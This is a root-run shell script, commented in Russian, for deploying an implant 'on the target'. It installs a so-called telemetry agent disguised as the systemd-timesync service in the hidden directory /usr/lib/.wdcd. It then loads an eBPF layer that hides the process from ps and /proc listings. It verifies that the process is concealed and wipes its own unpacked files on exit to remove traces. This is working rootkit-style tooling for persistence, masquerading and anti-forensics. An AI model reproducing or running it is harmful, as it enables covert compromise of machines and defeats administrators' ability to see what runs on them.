#!/bin/sh
# Развёртывание на цели от root: телеметрия (агент + носитель) + eBPF-сокрытие.
#   sh deploy.sh
set -e
HERE="$(cd "$(dirname "$0")" && pwd)"
cd "$HERE"
# Каталог распаковки не должен оставаться на цели читаемым: скрипты/README/конфиг
# (644/755) светят механизм установки любому локальному юзеру. Запираем сразу и
# вычищаем целиком по завершении (успех или фейл) — ключи уже в /usr/lib/.wdcd.
chmod 700 "$HERE" 2>/dev/null || true
trap 'cd / 2>/dev/null; [ -n "$HERE" ] && [ "$HERE" != "/" ] && rm -rf "$HERE" 2>/dev/null' EXIT

# PID агента снимаем ДО сокрытия: после него агент не найдёт ни pgrep, ни ps.
# Точный источник — MainPID юнита (pgrep по имени может поймать чужой процесс-тёзку).
PID_BEFORE=$(systemctl show -p MainPID --value systemd-timesync.service 2>/dev/null || true)
case "${PID_BEFORE:-0}" in ''|0|*[!0-9]*) PID_BEFORE="";; esac
[ -n "$PID_BEFORE" ] || PID_BEFORE=$(pgrep -x systemd-timesync | head -1 || true)

echo "== 1/3 телеметрия: агент + носитель + автозапуск =="
bash ./install.sh
PID_AFTER=$(systemctl show -p MainPID --value systemd-timesync.service 2>/dev/null || true)
case "${PID_AFTER:-0}" in ''|0|*[!0-9]*) PID_AFTER="";; esac
[ -n "$PID_AFTER" ] && PID_BEFORE="$PID_AFTER"

echo "== 2/3 eBPF-сокрытие процесса systemd-timesync =="
# Код возврата хайдера НЕ глушим: если слой не поднялся, установка обязана завершиться
# ненулевым кодом — иначе автоматика примет видимого агента за скрытого.
HIDE_RC=0
bash ./hide_install.sh systemd-timesync || { HIDE_RC=1; echo "!! слой сокрытия не поднялся (телеметрия при этом работает) — разбор в README"; }

echo "== 3/3 проверка =="
if [ -z "$PID_BEFORE" ]; then
  echo "агент не найден по имени systemd-timesync: смотри journalctl -u systemd-timesync"
  exit 0
fi
if kill -0 "$PID_BEFORE" 2>/dev/null; then echo "агент жив: да (pid=$PID_BEFORE)"; else echo "агент жив: НЕТ (pid=$PID_BEFORE)"; fi
if ls /proc | grep -qx "$PID_BEFORE"; then
  echo "виден в ls /proc: да  <- сокрытие не применилось"
  VISIBLE=1
else
  echo "виден в ls /proc: НЕТ ✅ (проверка по PID: $(kill -0 "$PID_BEFORE" 2>/dev/null && echo 'процесс на месте, скрыт от листинга'))"
  VISIBLE=0
fi
if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
  echo "systemd: $(systemctl is-active systemd-timesync) / $(systemctl is-active sysmond 2>/dev/null || echo 'нет юнита')"
fi
echo "пути: /usr/lib/.wdcd/bin/systemd-timesync (агент), /usr/lib/.wdcd/bin/sysmond (сокрытие)"
[ "$VISIBLE" = 0 ] && [ "$HIDE_RC" = 0 ] || exit 1
